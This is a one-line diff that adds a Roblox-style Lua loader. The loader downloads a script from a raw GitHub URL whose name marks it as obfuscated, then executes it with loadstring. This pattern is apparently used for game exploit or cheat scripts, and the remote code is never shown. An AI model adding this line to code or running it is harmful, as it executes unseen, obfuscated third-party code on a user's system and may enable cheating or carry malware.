@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/selym0905-ops/Examination/refs/heads/main/Examination-Main%20%5Bobf%5D"))()
